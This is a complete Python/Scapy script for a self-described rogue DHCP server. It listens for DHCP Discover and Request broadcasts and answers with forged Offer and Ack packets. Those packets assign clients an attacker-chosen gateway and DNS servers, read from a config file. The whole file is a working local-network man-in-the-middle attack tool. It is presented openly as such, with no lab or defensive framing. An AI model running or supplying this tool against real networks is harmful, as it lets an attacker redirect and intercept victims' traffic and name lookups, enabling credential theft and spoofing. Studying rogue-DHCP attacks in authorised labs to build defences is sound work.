#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
import threading
import time
import ipaddress
import argparse
import configparser
import logging

# Configure logging
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class RogueDHCPServer:
    def __init__(self, interface, ip_pool, subnet_mask, gateway, dns_servers, lease_time=300):
        self.interface = interface
        self.ip_pool = ip_pool
        self.subnet_mask = subnet_mask
        self.gateway = gateway
        self.dns_servers = dns_servers
        self.lease_time = lease_time
        self.allocated_ips = {}
        self.server_ip = gateway  # Using gateway IP as server IP
        
        # Convert IP pool string to list of available IPs
        network = ipaddress.ip_network(ip_pool, strict=False)
        self.available_ips = [str(ip) for ip in network.hosts()]
        
    def handle_dhcp_discover(self, packet):
        if DHCP in packet and packet[DHCP].options[0][1] == 1:  # DHCP Discover
            client_mac = packet[Ether].src
            transaction_id = packet[BOOTP].xid
            
            logger.info(f"Received DHCP Discover from {client_mac}")
            
            # Get an available IP
            if self.available_ips:
                offered_ip = self.available_ips.pop(0)
                self.allocated_ips[client_mac] = offered_ip
                
                logger.info(f"Offering IP {offered_ip} to {client_mac}")
                
                # Craft DHCP Offer
                dhcp_offer = Ether(src=get_if_hwaddr(self.interface), dst="ff:ff:ff:ff:ff:ff") / \
                            IP(src=self.server_ip, dst="255.255.255.255") / \
                            UDP(sport=67, dport=68) / \
                            BOOTP(op=2, xid=transaction_id, yiaddr=offered_ip, siaddr=self.server_ip, 
                                 chaddr=mac2str(client_mac)) / \
                            DHCP(options=[("message-type", "offer"),
                                         ("server_id", self.server_ip),
                                         ("subnet_mask", self.subnet_mask),
                                         ("router", self.gateway),
                                         ("name_server", self.dns_servers),
                                         ("lease_time", self.lease_time),
                                         "end"])
                
                sendp(dhcp_offer, iface=self.interface, verbose=0)
    
    def handle_dhcp_request(self, packet):
        if DHCP in packet and packet[DHCP].options[0][1] == 3:  # DHCP Request
            client_mac = packet[Ether].src
            transaction_id = packet[BOOTP].xid
            
            if client_mac in self.allocated_ips:
                assigned_ip = self.allocated_ips[client_mac]
                logger.info(f"Received DHCP Request from {client_mac} for IP {assigned_ip}")
                
                # Craft DHCP Ack
                dhcp_ack = Ether(src=get_if_hwaddr(self.interface), dst="ff:ff:ff:ff:ff:ff") / \
                          IP(src=self.server_ip, dst="255.255.255.255") / \
                          UDP(sport=67, dport=68) / \
                          BOOTP(op=2, xid=transaction_id, yiaddr=assigned_ip, siaddr=self.server_ip, 
                               chaddr=mac2str(client_mac)) / \
                          DHCP(options=[("message-type", "ack"),
                                       ("server_id", self.server_ip),
                                       ("subnet_mask", self.subnet_mask),
                                       ("router", self.gateway),
                                       ("name_server", self.dns_servers),
                                       ("lease_time", self.lease_time),
                                       "end"])
                
                sendp(dhcp_ack, iface=self.interface, verbose=0)
                logger.info(f"Sent DHCP Ack to {client_mac} with IP {assigned_ip}")
    
    def start(self):
        logger.info(f"Starting rogue DHCP server on interface {self.interface}")
        logger.info(f"Server IP: {self.server_ip}")
        logger.info(f"IP Pool: {self.ip_pool}")
        logger.info(f"Gateway: {self.gateway}")
        logger.info(f"DNS Servers: {', '.join(self.dns_servers)}")
        logger.info(f"Lease Time: {self.lease_time} seconds")
        
        # Start sniffing for DHCP packets
        sniff_filter = "udp and (port 67 or port 68)"
        sniff(iface=self.interface, filter=sniff_filter, prn=self.process_packet, store=0)
    
    def process_packet(self, packet):
        if DHCP in packet:
            message_type = packet[DHCP].options[0][1]
            if message_type == 1:  # DHCP Discover
                self.handle_dhcp_discover(packet)
            elif message_type == 3:  # DHCP Request
                self.handle_dhcp_request(packet)

def load_config(config_file):
    config = configparser.ConfigParser()
    config.read(config_file)
    
    return {
        'interface': config.get('DHCP', 'interface'),
        'ip_pool': config.get('DHCP', 'ip_pool'),
        'subnet_mask': config.get('DHCP', 'subnet_mask'),
        'gateway': config.get('DHCP', 'gateway'),
        'dns_servers': [s.strip() for s in config.get('DHCP', 'dns_servers').split(',')],
        'lease_time': config.getint('DHCP', 'lease_time')
    }

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Rogue DHCP Server")
    parser.add_argument("-c", "--config", default="config.ini", help="Configuration file")
    args = parser.parse_args()
    
    try:
        config = load_config(args.config)
        server = RogueDHCPServer(
            interface=config['interface'],
            ip_pool=config['ip_pool'],
            subnet_mask=config['subnet_mask'],
            gateway=config['gateway'],
            dns_servers=config['dns_servers'],
            lease_time=config['lease_time']
        )
        server.start()
    except Exception as e:
        logger.error(f"Error: {e}")
        exit(1)